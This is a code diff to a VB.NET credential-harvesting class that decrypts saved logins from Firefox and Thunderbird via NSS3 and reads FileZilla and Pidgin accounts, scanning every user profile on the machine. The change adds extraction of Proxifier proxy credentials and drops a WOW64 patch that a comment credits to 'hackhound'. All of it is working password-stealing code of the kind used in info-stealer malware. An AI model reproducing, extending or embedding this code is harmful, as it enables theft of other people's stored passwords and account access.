@@ -25,6 +25,7 @@
 '       AC.RecoverFileZilla()
 '       AC.RecoverPidgin()
 '       AC.RecoverThunderbird()
+'       AC.RecoverProxifier()
 '       For Each Account As PREC.Account In AC.Accounts
 '           Console.WriteLine(Account.ToString())
 '       Next
@@ -34,7 +35,6 @@
 
 Imports System.Runtime.InteropServices
 Imports System.IO
-Imports System.Security.Cryptography
 Imports System.Text
 Imports System.Text.RegularExpressions
 Imports System.Xml
@@ -42,20 +42,23 @@ Imports System.Xml
 Class PREC
 #Region "Win32/API+Other libs"
 #Region "Shared"
-    <DllImport("Crypt32.dll", SetLastError:=True, CharSet:=System.Runtime.InteropServices.CharSet.Auto)> _
+    <DllImport("Crypt32.dll", SetLastError:=True, CharSet:=CharSet.Auto)>
     Private Shared Function CryptUnprotectData(ByRef pDataIn As DATA_BLOB, ByVal szDataDescr As String, ByRef pOptionalEntropy As DATA_BLOB, ByVal pvReserved As IntPtr, ByRef pPromptStruct As CRYPTPROTECT_PROMPTSTRUCT, ByVal dwFlags As Integer, ByRef pDataOut As DATA_BLOB) As Boolean
     End Function
-    <Flags()> Enum CryptProtectPromptFlags
+    <Flags()>
+    Private Enum CryptProtectPromptFlags
         CRYPTPROTECT_PROMPT_ON_UNPROTECT = &H1
         CRYPTPROTECT_PROMPT_ON_PROTECT = &H2
     End Enum
-    <StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Unicode)> Structure CRYPTPROTECT_PROMPTSTRUCT
+    <StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Unicode)>
+    Private Structure CRYPTPROTECT_PROMPTSTRUCT
         Public cbSize As Integer
         Public dwPromptFlags As CryptProtectPromptFlags
         Public hwndApp As IntPtr
         Public szPrompt As String
     End Structure
-    <StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Unicode)> Structure DATA_BLOB
+    <StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Unicode)>
+    Private Structure DATA_BLOB
         Public cbData As Integer
         Public pbData As IntPtr
     End Structure
@@ -77,8 +80,8 @@ Class PREC
     Private NSS3 As IntPtr
     Private hModuleList As New List(Of IntPtr)
 
-    <StructLayout(LayoutKind.Sequential)> _
-    Structure TSECItem
+    <StructLayout(LayoutKind.Sequential)>
+    Private Structure TSECItem
         Public SECItemType As Integer
         Public SECItemData As Integer
         Public SECItemLen As Integer
@@ -113,7 +116,7 @@ Class PREC
         Return CreateAPI(Of DLLFunctionDelegate6)(NSS3, "NSS_Shutdown")()
     End Function
 
-    <DllImport("kernel32.dll", SetLastError:=True, CharSet:=System.Runtime.InteropServices.CharSet.Auto)> _
+    <DllImport("kernel32.dll", SetLastError:=True, CharSet:=CharSet.Auto)>
     Private Shared Function LoadLibrary(ByVal dllFilePath As String) As IntPtr
     End Function
 
@@ -138,15 +141,6 @@ Class PREC
     Private Function CreateAPI(Of T)(ByVal hModule As IntPtr, ByVal method As String) As T 'Simple overload to avoid loading the same library every time
         On Error Resume Next
         Return DirectCast(DirectCast(Marshal.GetDelegateForFunctionPointer(GetProcAddress(hModule, method), GetType(T)), Object), T)
-    End Function
-
-    'x64 patch (thanks to hackhound)
-    'appearently didn't work so i left it out below
-    <DllImport("kernel32.dll", SetLastError:=True)> _
-    Private Shared Function Wow64DisableWow64FsRedirection(ByRef ptr As IntPtr) As Boolean
-    End Function
-    <DllImport("kernel32.dll", SetLastError:=True)> _
-    Private Shared Function Wow64RevertWow64FsRedirection(ByVal ptr As IntPtr) As Boolean
     End Function
 #End Region
 #End Region
@@ -252,7 +246,6 @@ Class PREC
     End Function
 
     Public Function RecoverFireFox() As Boolean
-        Dim result As Boolean = False
         Try
             For Each AppData As String In GetAppDataFolders()
                 Dim mozProfilePath As String = FindFirefoxProfilePath(AppData)
@@ -275,7 +268,7 @@ Class PREC
                     FreeLibrary(hModule)
                 Next
             Next
-            result = True
+            Return True
         Catch e As Exception
 #If DEBUG Then
             'An unhandled exception of type 'System.NullReferenceException' occurred in x
@@ -284,28 +277,26 @@ Class PREC
             'The error above most likely means you are compiling to other than x86 architecture
             Throw e
 #End If
-            result = False
+            Return False
         End Try
-        Return result
     End Function
 #End Region
 #Region "Mozilla Thunderbird"
     Private Function FindThunderbirdProfilePath(ByVal AppDataDir As String) As String
-        Dim mozAPPDATA As String = AppDataDir & "\Roaming\Thunderbird"
-        If Not IO.Directory.Exists(mozAPPDATA) Then Return String.Empty : Exit Function
-        Dim mozProfile = New Regex("Path=([A-z0-9\/\.]+)").Match(IO.File.ReadAllText(mozAPPDATA & "\profiles.ini")).Groups(1).Value
-        Return mozAPPDATA & "\" & mozProfile
+        Dim mozThunderAPPDATA As String = AppDataDir & "\Roaming\Thunderbird"
+        If Not IO.Directory.Exists(mozThunderAPPDATA) Then Return String.Empty : Exit Function
+        Dim mozProfile = New Regex("Path=([A-z0-9\/\.]+)").Match(IO.File.ReadAllText(mozThunderAPPDATA & "\profiles.ini")).Groups(1).Value
+        Return mozThunderAPPDATA & "\" & mozProfile
     End Function
     Public Function RecoverThunderbird() As Boolean
-        Dim result As Boolean = False
-        Dim ptr As New IntPtr()
-        Wow64DisableWow64FsRedirection(ptr)
         Try
             For Each AppData As String In GetAppDataFolders()
-                Dim mozProfilePath As String = FindThunderbirdProfilePath(AppData)
-                If Not IO.Directory.Exists(mozProfilePath) Then Continue For
-                Dim mozLogins = IO.File.ReadAllText(mozProfilePath & "\logins.json")
-                NSS_Init(mozProfilePath & "\")
+                Dim mozThunderProfilePath As String = FindThunderbirdProfilePath(AppData)
+                If Not IO.Directory.Exists(mozThunderProfilePath) Then Continue For
+                Dim mozLogins = IO.File.ReadAllText(mozThunderProfilePath & "\logins.json")
+                NSS_Init(mozThunderProfilePath & "\")
+                Dim keySlot As Long = PK11_GetInternalKeySlot()
+                PK11_Authenticate(keySlot, True, 0)
                 Dim JSONRegex As New Regex("\""(hostname|encryptedPassword|encryptedUsername)"":""(.*?)""")
                 Dim mozMC = JSONRegex.Matches(mozLogins)
                 For I = 0 To mozMC.Count - 1 Step 3
@@ -320,15 +311,17 @@ Class PREC
                     FreeLibrary(hModule)
                 Next
             Next
-            result = True
+            Return True
         Catch e As Exception
 #If DEBUG Then
+            'An unhandled exception of type 'System.NullReferenceException' occurred in x
+            'Additional Information: Object reference Not set to an instance of an object.
+
+            'The error above most likely means you are compiling to other than x86 architecture
             Throw e
 #End If
-            result = False
+            Return False
         End Try
-        Wow64RevertWow64FsRedirection(ptr)
-        Return result
     End Function
 #End Region
 #Region "FileZilla"
@@ -384,6 +377,43 @@ Class PREC
         End Try
     End Function
 #End Region
+#Region "Proxifier"
+    ''' <summary>
+    ''' Recovers Proxifier Proxy list (TODO: detect/implement password cryptography algorithm)
+    ''' </summary>
+    ''' <returns></returns>
+    Public Function RecoverProxifier() As Boolean
+        Try
+            For Each AppData As String In GetAppDataFolders()
+                If Not IO.File.Exists(AppData & "\Roaming\Proxifier\Profiles\Default.ppx") Then Continue For
+                Dim Doc As New XmlDocument
+                Doc.Load(AppData & "\Roaming\Proxifier\Profiles\Default.ppx")
+                For Each Node As XmlNode In Doc.ChildNodes(1).SelectSingleNode("ProxyList").SelectNodes("Proxy")
+                    Dim IPAddress As String = "[" & Node.Attributes("type").Value & "]" & ExtractValue(Node, "Address") & ":" & ExtractValue(Node, "Port")
+                    Dim Username As String = ""
+                    Dim Password As String = ""
+                    For Each n As XmlNode In Node.ChildNodes
+                        If n.Name = "Authentication" Then
+                            If n.Attributes("enabled").Value = "true" Then
+                                Username = ExtractValue(n, "Username")
+                                Password = ExtractValue(n, "Password")
+                            End If
+                        End If
+                    Next
+                    Dim Proxifier As New Account(AccountType.Proxifier, Username, Password, IPAddress)
+                    Accounts.Add(Proxifier)
+                Next
+                Doc = Nothing
+            Next
+            Return True
+        Catch e As Exception
+#If DEBUG Then
+            Throw e
+#End If
+            Return False
+        End Try
+    End Function
+#End Region
 #End Region
 
 #Region "Hacks/Helpers"
@@ -398,14 +428,13 @@ Class PREC
     Private Function isWindowsXP() As Boolean
         Return (System.Environment.OSVersion.Version.Major = 5)
     End Function
-    Public Function GetAppDataFolders() As String()
+    Private Function GetAppDataFolders() As String()
+        On Error Resume Next
         Dim iList As New List(Of String)
         If isWindowsXP() Then
-            Try
-                For Each Dir As String In Directory.GetDirectories(Drive.RootDirectory.FullName & "Documents and Settings\", "*", SearchOption.TopDirectoryOnly)
-                    iList.Add(Dir & "Application Data")
-                Next
-            Catch : End Try
+            For Each Dir As String In Directory.GetDirectories(Drive.RootDirectory.FullName & "Documents and Settings\", "*", SearchOption.TopDirectoryOnly)
+                iList.Add(Dir & "Application Data")
+            Next
         Else
             For Each Dir As String In Directory.GetDirectories(Drive.RootDirectory.FullName & "Users\", "*", SearchOption.TopDirectoryOnly)
                 Dim dirInfo As New System.IO.DirectoryInfo(Dir)
@@ -422,22 +451,6 @@ Class PREC
         Next
         Return iList.ToArray
     End Function
-    Private Function InternalCheckIsWow64() As Boolean
-        If (Environment.OSVersion.Version.Major = 5 AndAlso Environment.OSVersion.Version.Minor >= 1) OrElse Environment.OSVersion.Version.Major >= 6 Then
-            Using p As Process = Process.GetCurrentProcess()
-                Dim retVal As Boolean
-                If Not IsWow64Process(p.Handle, retVal) Then
-                    Return False
-                End If
-                Return retVal
-            End Using
-        Else
-            Return False
-        End If
-    End Function
-
-    Private is64BitProcess As Boolean = (IntPtr.Size = 8)
-    Private is64BitOperatingSystem As Boolean = is64BitProcess OrElse InternalCheckIsWow64()
 
 #End Region
 
@@ -549,4 +562,5 @@ Enum AccountType
     FileZilla
     Pidgin
     Thunderbird
+    Proxifier
 End Enum
